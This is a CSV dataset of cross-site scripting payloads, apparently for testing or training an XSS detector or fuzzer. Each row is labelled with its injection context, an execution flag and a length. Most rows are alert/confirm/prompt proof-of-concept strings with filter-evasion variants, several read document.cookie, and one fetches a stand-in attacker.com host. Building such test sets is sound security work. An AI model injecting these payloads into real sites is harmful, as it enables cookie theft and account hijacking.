payload,context,exec,length
<script>alert(1)</script>,html_tag,1.0,25
<script>confirm(1)</script>,html_tag,1.0,27
<script>prompt(1)</script>,html_tag,1.0,26
<script>alert(document.cookie)</script>,html_tag,1.0,39
<script>fetch('http://attacker.com')</script>,html_tag,1.0,45
<img src=x onerror=alert(1)>,html_tag,1.0,28
<body onload=alert(1)>,html_tag,1.0,22
<svg onload=alert(1)>,svg_context,1.0,21
<input onfocus=alert(1) autofocus>,html_tag,1.0,34
<details open ontoggle=alert(1)>,html_tag,1.0,32
<ScRiPt>alert(1)</ScRiPt>,html_tag,1.0,25
<script>alert(String.fromCharCode(49))</script>,html_tag,1.0,47
<script>\u0061lert(1)</script>,html_tag,1.0,30
""" onmouseover=alert(1)",html_attribute,1.0,22
"""><script>alert(1)</script>",html_attribute,1.0,27
<svg/onload=alert(1)>,html_tag,1.0,21
javascript:alert(1),url_href,1.0,19
"data:text/html,<script>alert(1)</script>",url_navigation,1.0,40
'><svg/onload=alert(1)>,html_attribute,1.0,23
"""><img src=x onerror=confirm(1)>",html_attribute,1.0,32
</script><script>alert(1)</script>,script_block,1.0,34
<script>alert(document.domain)</script>,html_tag,1.0,39
%3Cscript%3Ealert(1)%3C%2Fscript%3E,html_tag,1.0,35
<scr<script>ipt>alert(1)</scr</script>ipt>,html_tag,1.0,42
<script>alert`1`</script>,html_tag,1.0,25
<script>window.alert(1)</script>,html_tag,1.0,32
<script>top.alert(1)</script>,html_tag,1.0,29
<script>this.alert(1)</script>,html_tag,1.0,30
<img src=x onerror=confirm(1)>,html_tag,1.0,30
<img src=x onerror=prompt(1)>,html_tag,1.0,29
<img src=1 onerror=alert(1)>,html_tag,1.0,28
<img src=a onerror=alert(document.cookie)>,html_tag,1.0,42
<img src=x onerror=alert('XSS')>,html_tag,1.0,32
<img src=x onerror=alert(window.origin)>,html_tag,1.0,40
<img src=x onerror=alert(location)>,html_tag,1.0,35
<img src=x onerror=alert(navigator.userAgent)>,html_tag,1.0,46
<img src=x onerror=alert(document.URL)>,html_tag,1.0,39
<svg onload=prompt(1)>,html_tag,1.0,22
<svg><script>alert(1)</script>,html_tag,1.0,30
<svg><script>alert(document.domain)</script>,html_tag,1.0,44
<svg><script>confirm(1)</script>,html_tag,1.0,32
<svg><script>prompt(1)</script>,html_tag,1.0,31
<svg onload=alert(document.cookie)>,html_tag,1.0,35
<svg onload=alert(location)>,html_tag,1.0,28
""" onmouseover=alert(1) """,html_attribute,1.0,24
""" onclick=alert(1)",html_attribute,1.0,18
""" onclick=alert(1) """,html_attribute,1.0,20
""" onmouseenter=alert(1) """,html_attribute,1.0,25
onmouseover=alert(1),html_attribute,1.0,20
""" onmouseleave=alert(1) """,html_attribute,1.0,25
""" onkeyup=alert(1) """,html_attribute,1.0,20
""" onkeydown=alert(1) """,html_attribute,1.0,22
""" oninput=alert(1) """,html_attribute,1.0,20
""";confirm(1);//",script_block,1.0,15
""";prompt(1);//",script_block,1.0,14
""";alert(document.domain);//",script_block,1.0,27
""";alert(document.cookie);//",script_block,1.0,27
""";alert(location);//",script_block,1.0,20
""";alert(window.origin);//",script_block,1.0,25
""";alert(navigator.userAgent);//",script_block,1.0,31
""";alert(document.title);//",script_block,1.0,26
""";alert(history.length);//",script_block,1.0,26
javascript:confirm(1),url_href,1.0,21
javascript:prompt(1),url_href,1.0,20
javascript:alert(document.domain),url_href,1.0,33
javascript:alert(document.cookie),url_href,1.0,33
javascript:alert(location),url_href,1.0,26
javascript:alert(window.origin),url_href,1.0,31
javascript:alert(document.title),url_href,1.0,32
javascript:alert(navigator.userAgent),url_href,1.0,37
javascript:alert(history.length),url_href,1.0,32
"data:text/html,<script>alert(document.domain)</script>",url_navigation,1.0,54
"data:text/html,<img src=x onerror=alert(1)>",url_navigation,1.0,43
"data:text/html,<svg onload=alert(1)>",url_navigation,1.0,36
"data:text/html,<script>confirm(1)</script>",url_navigation,1.0,42
"data:text/html,<script>prompt(1)</script>",url_navigation,1.0,41
"data:text/html,<script>alert(document.cookie)</script>",url_navigation,1.0,54
</pre><svg/onload=alert`1`>,html_tag,1.0,27
</pre><img src=x onerror=alert`1`>,html_tag,1.0,34
</pre><details open ontoggle=alert(1)>,html_tag,1.0,38
</pre><marquee onmouseover=alert(1)>hover me</marquee,html_tag,1.0,53
